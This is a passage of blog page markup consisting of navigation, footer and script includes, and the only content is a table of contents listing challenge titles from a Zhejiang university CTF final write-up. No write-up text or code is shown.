        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text">第七届浙江省大学生网络与信息安全竞赛决赛 WirteUp By A1natas</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6"><span class="nav-text">题目附件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-text">签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wucanrce"><span class="nav-text">wucanrce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unserialize"><span class="nav-text">unserialize</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FinalLogin"><span class="nav-text">FinalLogin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E9%BB%91%E5%8D%B3%E7%99%BD"><span class="nav-text">非黑即白</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A9%E5%91%BD%E4%BA%BA%EF%BC%88%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="nav-text">天命人（赛后复现）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#printFFF"><span class="nav-text">printFFF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reverse-stack"><span class="nav-text">reverse_stack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezPwn"><span class="nav-text">ezPwn</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reverse2"><span class="nav-text">Reverse2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reverse1"><span class="nav-text">Reverse1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reverse3"><span class="nav-text">Reverse3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MyCode"><span class="nav-text">MyCode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DlcgH-r"><span class="nav-text">DlcgH_r</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8"><span class="nav-text">数据安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#datasecurity-classify1"><span class="nav-text">datasecurity_classify1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#datasecurity-classify2"><span class="nav-text">datasecurity_classify2</span></a></li></ol></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2023</span>&nbsp;-&nbsp;2025
        
            &nbsp;</i>&nbsp;&nbsp;<a href="/">C3ngH</a>
        
    </div>

    

    
        <div class="count-info info-item">
            
                <span class="count-item border-box word">
                    <span class="item-type border-box">总字数</span>
                    <span class="item-value border-box word">84.3k</span>
                </span>
            

            
                <span class="count-item border-box uv">
                    <span class="item-type border-box">访客数</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-item border-box pv">
                    <span class="item-type border-box">访问量</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text">第七届浙江省大学生网络与信息安全竞赛决赛 WirteUp By A1natas</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6"><span class="nav-text">题目附件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-text">签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wucanrce"><span class="nav-text">wucanrce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unserialize"><span class="nav-text">unserialize</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FinalLogin"><span class="nav-text">FinalLogin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E9%BB%91%E5%8D%B3%E7%99%BD"><span class="nav-text">非黑即白</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A9%E5%91%BD%E4%BA%BA%EF%BC%88%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="nav-text">天命人（赛后复现）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#printFFF"><span class="nav-text">printFFF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reverse-stack"><span class="nav-text">reverse_stack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezPwn"><span class="nav-text">ezPwn</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reverse2"><span class="nav-text">Reverse2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reverse1"><span class="nav-text">Reverse1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reverse3"><span class="nav-text">Reverse3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MyCode"><span class="nav-text">MyCode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DlcgH-r"><span class="nav-text">DlcgH_r</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8"><span class="nav-text">数据安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#datasecurity-classify1"><span class="nav-text">datasecurity_classify1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#datasecurity-classify2"><span class="nav-text">datasecurity_classify2</span></a></li></ol></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->

    
<script src="/js/local-search.js"></script>



<!-- lazyload -->

    
<script src="/js/lazyload.js"></script>



<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
